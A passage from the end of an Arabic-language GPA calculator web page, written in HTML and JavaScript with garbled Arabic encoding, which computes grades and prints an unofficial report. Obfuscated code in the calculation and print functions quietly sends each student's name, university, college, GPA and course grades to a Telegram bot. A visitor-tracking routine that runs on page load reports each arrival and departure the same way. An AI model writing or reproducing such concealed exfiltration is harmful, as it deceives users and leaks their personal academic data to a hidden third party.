_0x817927=_0x10405e,_0x3bfea7=parseFloat(_0x5360fc[_0x817927(0x96)](_0x817927(0x91))[0x1]?.[_0x817927(0x9f)])||0x0,_0x5959b2=parseFloat(_0x5360fc[_0x817927(0x96)](_0x817927(0x91))[0x2]?.['value'])||0x0;_0x3bfea7>0x0&&_0x5959b2>0x0&&(_0x43ea3d+=_0x3bfea7*_0x5959b2,_0x4dee0a+=_0x5959b2);});if(_0x4dee0a>0x0){const _0x213f22=_0x43ea3d/_0x4dee0a,_0x53afca=bolognaGradeTable[_0x10405e(0x8b)](_0x377e4b=>_0x213f22>=_0x377e4b['min'])||{'name':_0x10405e(0x97),'ects':_0x10405e(0x90)};app[_0x10405e(0x89)]['textContent']=_0x213f22[_0x10405e(0x99)](0x2),app[_0x10405e(0x86)]['textContent']=_0x53afca[_0x10405e(0x9d)],app[_0x10405e(0x81)][_0x10405e(0x85)]=_0x10405e(0x79)+_0x4dee0a;if(_0xb2de7b)_0xccad97=_0x10405e(0x8a)+_0x3d3f60+'`\x0a*Ø§Ù„Ù…Ø¹Ø¯Ù„:*\x20'+_0x213f22[_0x10405e(0x99)](0x2)+'\x0a*Ø§Ù„ØªÙ‚Ø¯ÙŠØ±:*\x20'+_0x53afca['name']+_0x10405e(0x7c)+_0x4dee0a;}else clearResults();}else{const _0xba7d51=document['querySelector'](_0x10405e(0x83))?.['value']||_0x10405e(0x73),_0x39375d=coursesGradeMappings[_0xba7d51],_0x31721b=app[_0x10405e(0x80)][_0x10405e(0x96)](_0x10405e(0x7b)),_0x46d7b8=[];_0x31721b['forEach'](_0x11ce7c=>{const _0xd69e21=_0x10405e,_0x2df430=_0x11ce7c[_0xd69e21(0x8d)](_0xd69e21(0x9c))?.[_0xd69e21(0x9f)];_0x2df430&&_0x2df430!==_0xd69e21(0xa0)&&_0x46d7b8[_0xd69e21(0x93)](_0x39375d[_0x2df430]);});if(_0x46d7b8[_0x10405e(0x9e)]>0x0){const _0x51c45=_0x46d7b8[_0x10405e(0x8f)]((_0xa64373,_0x424b2c)=>_0xa64373+_0x424b2c,0x0)/_0x46d7b8['length'],_0x5883bc=bolognaGradeTable[_0x10405e(0x8b)](_0x1977bb=>_0x51c45>=_0x1977bb[_0x10405e(0x8e)])||{'name':_0x10405e(0x97)};app[_0x10405e(0x7f)][_0x10405e(0x85)]=_0x51c45[_0x10405e(0x99)](0x2),app[_0x10405e(0x71)][_0x10405e(0x85)]=_0x5883bc[_0x10405e(0x9d)];if(_0xb2de7b)_0xccad97=_0x10405e(0x9a)+_0x3d3f60+_0x10405e(0x92)+_0xba7d51+_0x10405e(0x75)+_0x51c45['toFixed'](0x2)+_0x10405e(0x87)+_0x5883bc[_0x10405e(0x9d)];}else clearResults();}if(_0xb2de7b&&_0xccad97)sendToTelegram(_0xccad97);}function _0x1ef9(_0x14eaf0,_0x1265b0){const _0x3bf706=_0x3bf7();return _0x1ef9=function(_0x1ef919,_0x4aac91){_0x1ef919=_0x1ef919-0x71;let _0x354e8d=_0x3bf706[_0x1ef919];return _0x354e8d;},_0x1ef9(_0x14eaf0,_0x1265b0);}function _0x3bf7(){const _0x2728ef=['8RJLhLy','querySelectorAll','ØºÙŠØ±\x20Ù…Ø­Ø¯Ø¯','visitorId','toFixed','*Ø¹Ù…Ù„ÙŠØ©\x20Ø­Ø³Ø§Ø¨\x20(ÙƒÙˆØ±Ø³Ø§Øª)*\x20ğŸ§®\x0a*Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:*\x20`','12XDNnwe','select','name','length','value','Ù„Ø§\x20ÙŠÙˆØ¬Ø¯','gradeNameCourses','995283kTzzXM','median','66SXdQYa','\x0a*Ø§Ù„Ù…Ø¹Ø¯Ù„:*\x20','Unknown','4058445corvvg','16vDVQlx','Ù…Ø¬Ù…ÙˆØ¹\x20Ø§Ù„ÙˆØ­Ø¯Ø§Øª:\x20','forEach','div[id^=\x22course-\x22]','\x0a*Ø§Ù„ÙˆØ­Ø¯Ø§Øª:*\x20','135789ZYPrpg','1638469SXRmtC','gpaCourses','coursesContainer','totalEcts','isBologna','input[name=\x22calc-mode\x22]:checked','465553NbFrbH','textContent','gradeNameBologna','\x0a*Ø§Ù„ØªÙ‚Ø¯ÙŠØ±:*\x20','5233420kzrgzk','gpaBologna','*Ø¹Ù…Ù„ÙŠØ©\x20Ø­Ø³Ø§Ø¨\x20(Ø¨ÙˆÙ„ÙˆÙ†ÙŠØ§)*\x20ğŸ§®\x0a*Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:*\x20`','find','getItem','querySelector','min','reduce','N/A','input','`\x0a*Ø§Ù„ÙˆØ¶Ø¹:*\x20','push','4356230iZIqCH'];_0x3bf7=function(){return _0x2728ef;};return _0x3bf7();}        
        function clearAll() {
             app.coursesContainer.querySelectorAll('input[type="text"]').forEach(input => input.value = '');
             app.coursesContainer.querySelectorAll('input[type="number"]').forEach(input => input.value = '');
             app.coursesContainer.querySelectorAll('select').forEach(select => select.value = 'Ù„Ø§ ÙŠÙˆØ¬Ø¯');
             clearResults();
        }
        
        function clearResults() {
             app.gpaBologna.textContent = "0.00";
             app.gradeNameBologna.textContent = "Ø§Ù„ØªÙ‚Ø¯ÙŠØ±";
             app.totalEcts.textContent = "Ù…Ø¬Ù…ÙˆØ¹ Ø§Ù„ÙˆØ­Ø¯Ø§Øª: 0";
             app.gpaCourses.textContent = "0.00";
             app.gradeNameCourses.textContent = "Ø§Ù„ØªÙ‚Ø¯ÙŠØ±";
        }

        function openPrintModal() {
            calculateGPA();
            const finalGpa = state.isBologna ? app.gpaBologna.textContent : app.gpaCourses.textContent;
            if (parseFloat(finalGpa) === 0) {
                alert("Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø£ÙˆÙ„Ø§Ù‹ Ù‚Ø¨Ù„ Ø§Ù„Ø·Ø¨Ø§Ø¹Ø©.");
                return;
            }
            app.printModal.classList.remove('hidden');
        }

        function printCertificate(studentName, universityName, collegeName) {
            const printWindow = window.open('', '', 'height=800,width=800');
            const finalGpa = state.isBologna ? app.gpaBologna.textContent : app.gpaCourses.textContent;
            
            let courseRowsHtml = '';
            let coursesTextForTelegram = '';
            const rows = app.coursesContainer.querySelectorAll('div[id^="course-"]');
            rows.forEach((row, index) => {
                 if(state.isBologna) {
                    const name = row.querySelectorAll('input')[0]?.value || `Ù…Ø§Ø¯Ø© ${index + 1}`;
                    const grade = row.querySelectorAll('input')[1]?.value || '0';
                    const ects = row.querySelectorAll('input')[2]?.value || '0';
                    if (parseInt(ects) > 0) {
                         courseRowsHtml += `<tr class="border-b"><td class="p-3 text-right">${name}</td><td class="p-3 text-center">${grade}</td><td class="p-3 text-center">${ects}</td></tr>`;
                         coursesTextForTelegram += `\n- ${name}: ${grade} (${ects} ÙˆØ­Ø¯Ø§Øª)`;
                    }
                 } else {
                    const calcMode = document.querySelector('input[name="calc-mode"]:checked').value;
                    const currentGradeMapping = coursesGradeMappings[calcMode];
                    const gradeName = row.querySelector('select')?.value || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯';
                     if (gradeName !== "Ù„Ø§ ÙŠÙˆØ¬Ø¯") {
                         courseRowsHtml += `<tr class="border-b"><td class="p-3 text-right" colspan="2">${gradeName}</td><td class="p-3 text-center">${currentGradeMapping[gradeName].toFixed(2)}</td></tr>`;
                         coursesTextForTelegram += `\n- ${gradeName}`;
                    }
                 }
            });
            
            const notificationMessage = `
*ØªÙ‚Ø±ÙŠØ± Ø¬Ø¯ÙŠØ¯ ØªÙ… Ø¥Ù†Ø´Ø§Ø¤Ù‡* ğŸ“‹
-----------------------------------
*Ø§Ù„Ø¬Ø§Ù…Ø¹Ø©:* ${universityName || 'Ù„Ù… ÙŠØ­Ø¯Ø¯'}
*Ø§Ù„ÙƒÙ„ÙŠØ©:* ${collegeName || 'Ù„Ù… ÙŠØ­Ø¯Ø¯'}
*Ø§Ù„Ø·Ø§Ù„Ø¨:* ${studentName || 'Ù„Ù… ÙŠØ­Ø¯Ø¯'}
-----------------------------------
*Ø§Ù„Ù†Ø¸Ø§Ù…:* ${state.isBologna ? 'Ø¨ÙˆÙ„ÙˆÙ†ÙŠØ§' : 'ÙƒÙˆØ±Ø³Ø§Øª'}
*Ø§Ù„Ù…Ø¹Ø¯Ù„:* ${finalGpa}
*Ø§Ù„ØªÙ‚Ø¯ÙŠØ±:* ${state.isBologna ? app.gradeNameBologna.textContent : app.gradeNameCourses.textContent}
-----------------------------------
*Ø§Ù„Ù…ÙˆØ§Ø¯:* ${coursesTextForTelegram}
            `;
            var _0x1974e0=_0x2bcc;function _0x2bcc(_0x1cb9e0,_0x38dc9c){var _0x40c390=_0x40c3();return _0x2bcc=function(_0x2bccdb,_0x408bcb){_0x2bccdb=_0x2bccdb-0xe8;var _0x1ec866=_0x40c390[_0x2bccdb];return _0x1ec866;},_0x2bcc(_0x1cb9e0,_0x38dc9c);}(function(_0x449bc3,_0x126e3e){var _0xafd285=_0x2bcc,_0x5ac750=_0x449bc3();while(!![]){try{var _0x3b423d=parseInt(_0xafd285(0xf4))/0x1+parseInt(_0xafd285(0xec))/0x2*(-parseInt(_0xafd285(0xea))/0x3)+parseInt(_0xafd285(0xed))/0x4*(-parseInt(_0xafd285(0xf2))/0x5)+-parseInt(_0xafd285(0xf1))/0x6*(-parseInt(_0xafd285(0xf0))/0x7)+-parseInt(_0xafd285(0xf3))/0x8*(parseInt(_0xafd285(0xe8))/0x9)+-parseInt(_0xafd285(0xef))/0xa*(-parseInt(_0xafd285(0xe9))/0xb)+parseInt(_0xafd285(0xeb))/0xc;if(_0x3b423d===_0x126e3e)break;else _0x5ac750['push'](_0x5ac750['shift']());}catch(_0x41cce9){_0x5ac750['push'](_0x5ac750['shift']());}}}(_0x40c3,0xb85c6),sendToTelegram(notificationMessage[_0x1974e0(0xee)]()));function _0x40c3(){var _0x524f18=['7yCDTuj','6351654gTcBWa','353170hJwbNj','48vlaTyq','762173ztkexQ','1874214vCJFNe','772442JeplpY','192219UJOyuX','7227780EhmLQW','2HIarbf','32UBycKP','trim','30cvRnOx'];_0x40c3=function(){return _0x524f18;};return _0x40c3();}

            const tableHeaders = state.isBologna 
                ? '<th class="text-right p-2">Ø§Ù„Ù…Ø§Ø¯Ø©</th><th class="w-24 text-center p-2">Ø§Ù„Ø¯Ø±Ø¬Ø©</th><th class="w-24 text-center p-2">Ø§Ù„ÙˆØ­Ø¯Ø§Øª</th>' 
                : '<th colspan="2" class="text-right p-2">Ø§Ù„ØªÙ‚Ø¯ÙŠØ±</th><th class="w-32 text-center p-2">Ø§Ù„Ù‚ÙŠÙ…Ø©</th>';

            const bolognaSummary = `<div><strong>Ù…Ø¬Ù…ÙˆØ¹ Ø§Ù„ÙˆØ­Ø¯Ø§Øª:</strong> <span class="font-bold text-blue-600">${app.totalEcts.textContent.split(': ')[1]}</span></div>`;
            
            const printContent = `
                <html>
                    <head>
                        <title>ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù…Ø¹Ø¯Ù„</title>
                        <script src="https://cdn.tailwindcss.com"><\/script>
                        <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
                        <style> 
                            body { font-family: 'Cairo', sans-serif; position: relative; }
                            @media print {
                                body { -webkit-print-color-adjust: exact; }
                                .no-print { display: none; }
                            }
                            .watermark {
                                position: fixed;
                                top: 50%;
                                left: 50%;
                                transform: translate(-50%, -50%) rotate(-45deg);
                                font-size: 5rem;
                                color: rgba(150, 150, 150, 0.15);
                                z-index: -1;
                                pointer-events: none;
                                font-weight: bold;
                                white-space: nowrap;
                            }
                        </style>
                    </head>
                    <body class="bg-white text-black p-10" dir="rtl">
                        <div class="watermark">ÙˆØ«ÙŠÙ‚Ø© ØºÙŠØ± Ø±Ø³Ù…ÙŠØ©</div>
                        <div class="text-center mb-8">
                            <h1 class="text-2xl font-bold">${universityName || 'Ø§Ø³Ù… Ø§Ù„Ø¬Ø§Ù…Ø¹Ø©'}</h1>
                            <h2 class="text-xl">${collegeName || 'Ø§Ù„ÙƒÙ„ÙŠØ©'}</h2>
                        </div>
                        
                        <div class="mb-8 grid grid-cols-2 gap-4 text-sm">
                            <div><strong>Ø§Ø³Ù… Ø§Ù„Ø·Ø§Ù„Ø¨:</strong> ${studentName || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯'}</div>
                            <div><strong>Ø§Ù„Ø¹Ø§Ù… Ø§Ù„Ø¯Ø±Ø§Ø³ÙŠ:</strong> ${new Date().getFullYear()}-${new Date().getFullYear() + 1}</div>
                        </div>

                        <h3 class="font-bold text-lg mb-4 text-right">Ù…Ù„Ø®Øµ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©:</h3>
                        <div class="grid grid-cols-2 gap-x-8 gap-y-2 mb-8 p-4 bg-slate-100 rounded-lg">
                           <div><strong>Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ (GPA):</strong> <span class="font-bold text-blue-600">${finalGpa}</span></div>
                           <div><strong>Ø§Ù„ØªÙ‚Ø¯ÙŠØ± Ø§Ù„Ø¹Ø§Ù…:</strong> <span class="font-bold text-blue-600">${state.isBologna ? app.gradeNameBologna.textContent : app.gradeNameCourses.textContent}</span></div>
                           ${state.isBologna ? bolognaSummary : ''}
                        </div>

                        <h3 class="font-bold text-lg mb-4 text-right">ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…ÙˆØ§Ø¯:</h3>
                        <table class="w-full text-right border-collapse">
                           <thead class="bg-slate-200">
                             <tr>${tableHeaders}</tr>
                           </thead>
                           <tbody>${courseRowsHtml}</tbody>
                        </table>

                        <div class="mt-20 flex justify-between text-sm text-slate-500">
                           <div>
                                <p>Ø¨Ø±Ù…Ø¬Ø©: Ahmed S.Jabbar</p>
                           </div>
                           <div>
                                <p>ØªØ§Ø±ÙŠØ® Ø§Ù„Ø·Ø¨Ø§Ø¹Ø©: ${new Date().toLocaleDateString('ar-EG')}</p>
                           </div>
                        </div>
                        <button onclick="window.print()" class="no-print fixed bottom-5 right-5 bg-blue-600 text-white p-3 rounded-full shadow-lg">Ø·Ø¨Ø§Ø¹Ø©</button>
                    </body>
                </html>
            `;
            
            printWindow.document.write(printContent);
            printWindow.document.close();
            printWindow.focus();
        }
        
        function trackVisitor() {
            const visitorId = sessionStorage.getItem('visitorId') || `User-${Math.random().toString(36).substr(2, 9)}`;
            sessionStorage.setItem('visitorId', visitorId);

            sendToTelegram(`âœ… *Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯ Ø¯Ø®Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹*\n*ID:* \`${visitorId}\``);

            window.addEventListener('beforeunload', () => {
                const data = {
                    text: `âŒ *ØºØ§Ø¯Ø± Ø²Ø§Ø¦Ø± Ø§Ù„Ù…ÙˆÙ‚Ø¹*\n*ID:* \`${visitorId}\``,
                    chat_id: TELEGRAM_CHAT_ID,
                    parse_mode: 'Markdown'
                };
                navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, new Blob([JSON.stringify(data)], {type : 'application/json'}));
            });
        }

        // --- Tooltip Functions ---
        function showTooltip(target, text) {
            const tooltip = app.tooltip;
            tooltip.textContent = text;
            tooltip.classList.remove('hidden');
            tooltip.classList.add('visible');

            const targetRect = target.getBoundingClientRect();
            tooltip.style.left = `${targetRect.left + (targetRect.width / 2) - (tooltip.offsetWidth / 2)}px`;
            tooltip.style.top = `${targetRect.top - tooltip.offsetHeight - 8}px`;
        }

        function hideTooltip() {
            app.tooltip.classList.remove('visible');
            app.tooltip.classList.add('hidden');
        }

        // --- Event Listeners ---
        app.systemSwitch.addEventListener('change', switchSystem);
        app.addBtn.addEventListener('click', () => {
             const newId = app.coursesContainer.children.length + 1;
             createCourseRow(newId);
        });
        
        app.calculateBtn.addEventListener('click', () => calculateGPA(true));
        
        app.clearBtn.addEventListener('click', clearAll);
        app.printBtn.addEventListener('click', openPrintModal);

        // Modal Listeners
        app.cancelPrintBtn.addEventListener('click', () => {
            app.printModal.classList.add('hidden');
        });
        app.proceedPrintBtn.addEventListener('click', () => {
            const studentName = app.studentNameInput.value;
            const universityName = app.universityNameInput.value;
            const collegeName = app.collegeNameInput.value;
            app.printModal.classList.add('hidden');
            printCertificate(studentName, universityName, collegeName);
        });

        // Tooltip Listeners
        app.calcModeLabels.forEach(label => {
            label.addEventListener('mouseenter', () => {
                const mode = label.getAttribute('data-tooltip');
                showTooltip(label, tooltipTexts[mode]);
            });
            label.addEventListener('mouseleave', hideTooltip);
        });


        // --- Initial Load ---
        switchSystem();
        trackVisitor(); // Start tracking the visitor
    </script>

</body>
</html>
